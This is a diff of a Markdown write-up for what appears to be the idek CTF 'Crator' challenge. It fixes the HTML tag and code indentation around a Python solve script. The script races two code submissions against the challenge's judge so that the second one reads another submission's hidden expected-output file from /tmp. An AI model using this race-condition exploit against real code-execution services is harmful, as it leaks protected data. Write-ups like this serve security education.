@@ -360,81 +360,81 @@ Armed with the above information, we can write a solve script that contains the 
     1. Submit a correct answer, which temporarily writes the last test case's output to `/tmp/1.expected`
     2. Submit an incorrect answer, which reads the first request's last test case's output at `/tmp/1.expected`
 
-<detail>
+<details>
     <summary>solve.py</summary>
 
-    ```python
-    import asyncio
-    import aiohttp
-    from bs4 import BeautifulSoup
+```python
+import asyncio
+import aiohttp
+from bs4 import BeautifulSoup
 
-    class Solver:
-        def __init__(self, baseUrl):
-            self.baseUrl = baseUrl
-            self.REGISTER_ACCOUNT_URL = f'{self.baseUrl}/register'
-            self.USERNAME, self.PASSWORD = 'user', 'password'
-            self.LOGIN_URL = f'{self.baseUrl}/login'
-            self.SUBMIT_HELLO_INPUT_PROBLEM_URL = f'{self.baseUrl}/submit/helloinput'
-            
-        async def registerAndLogin(self, session):
-            await session.post(self.REGISTER_ACCOUNT_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
-            await session.post(self.LOGIN_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
+class Solver:
+    def __init__(self, baseUrl):
+        self.baseUrl = baseUrl
+        self.REGISTER_ACCOUNT_URL = f'{self.baseUrl}/register'
+        self.USERNAME, self.PASSWORD = 'user', 'password'
+        self.LOGIN_URL = f'{self.baseUrl}/login'
+        self.SUBMIT_HELLO_INPUT_PROBLEM_URL = f'{self.baseUrl}/submit/helloinput'
         
-        async def sendSubmitRequest(self, session, payload, delay=False):
-            # wait for the last test case's output is being written to /tmp/<submission_id>.expected
-            if delay == True:
-                await asyncio.sleep(0.2)
+    async def registerAndLogin(self, session):
+        await session.post(self.REGISTER_ACCOUNT_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
+        await session.post(self.LOGIN_URL, data={ 'username': self.USERNAME, 'password': self.PASSWORD })
+    
+    async def sendSubmitRequest(self, session, payload, delay=False):
+        # wait for the last test case's output is being written to /tmp/<submission_id>.expected
+        if delay == True:
+            await asyncio.sleep(0.2)
 
-            async with session.post(self.SUBMIT_HELLO_INPUT_PROBLEM_URL, data={ 'code': payload }, allow_redirects=True) as response:
-                responseText = await response.text()
-                soup = BeautifulSoup(responseText, 'html.parser')
-                result = soup.findAll('pre')[2].text.strip()
-                if len(result) == 0:
-                    return 'No result'
+        async with session.post(self.SUBMIT_HELLO_INPUT_PROBLEM_URL, data={ 'code': payload }, allow_redirects=True) as response:
+            responseText = await response.text()
+            soup = BeautifulSoup(responseText, 'html.parser')
+            result = soup.findAll('pre')[2].text.strip()
+            if len(result) == 0:
+                return 'No result'
 
-                return result
+            return result
 
-        async def getAndExecuteSubmitRequestTask(self, session, submissionId):
-            correctAnswer = '''\
-    answer = input()
-    print(answer)
+    async def getAndExecuteSubmitRequestTask(self, session, submissionId):
+        correctAnswer = '''\
+answer = input()
+print(answer)
 
-    # we want to print out the correct answer first, 
-    # then increase the race window
-    if answer != 'Welcome to Crator':
-        while True:
-            pass
-    '''
-            payload = f'''\
-    with open('/tmp/{submissionId}.expected', 'r') as file:
-        print(file.read())
-    '''
+# we want to print out the correct answer first, 
+# then increase the race window
+if answer != 'Welcome to Crator':
+    while True:
+        pass
+'''
+        payload = f'''\
+with open('/tmp/{submissionId}.expected', 'r') as file:
+    print(file.read())
+'''
 
-            tasks = list()
-            tasks.append(self.sendSubmitRequest(session, correctAnswer))
-            tasks.append(self.sendSubmitRequest(session, payload, delay=True))
-            return await asyncio.gather(*tasks)
+        tasks = list()
+        tasks.append(self.sendSubmitRequest(session, correctAnswer))
+        tasks.append(self.sendSubmitRequest(session, payload, delay=True))
+        return await asyncio.gather(*tasks)
 
-        async def solve(self, submissionId='1'):
-            async with aiohttp.ClientSession() as session:
-                await self.registerAndLogin(session)
+    async def solve(self, submissionId='1'):
+        async with aiohttp.ClientSession() as session:
+            await self.registerAndLogin(session)
 
-                results = await self.getAndExecuteSubmitRequestTask(session, submissionId)
-                for i, result in enumerate(results):
-                    if i == 0:
-                        print(f'[+] First request output: {result}')
-                    elif i == 1:
-                        print(f'[+] Second request output: {result}')
+            results = await self.getAndExecuteSubmitRequestTask(session, submissionId)
+            for i, result in enumerate(results):
+                if i == 0:
+                    print(f'[+] First request output: {result}')
+                elif i == 1:
+                    print(f'[+] Second request output: {result}')
 
-    if __name__ == '__main__':
-        baseUrl = 'https://crator-5ec1b9acda7c9be6.instancer.idek.team/'
-        # baseUrl = 'http://localhost:1337'
-        solver = Solver(baseUrl)
+if __name__ == '__main__':
+    baseUrl = 'https://crator-5ec1b9acda7c9be6.instancer.idek.team/'
+    # baseUrl = 'http://localhost:1337'
+    solver = Solver(baseUrl)
 
-        # submissionId = '3'
-        # asyncio.run(solver.solve(submissionId))
-        asyncio.run(solver.solve())
-    ```
+    # submissionId = '3'
+    # asyncio.run(solver.solve(submissionId))
+    asyncio.run(solver.solve())
+```
 
 </details>
 
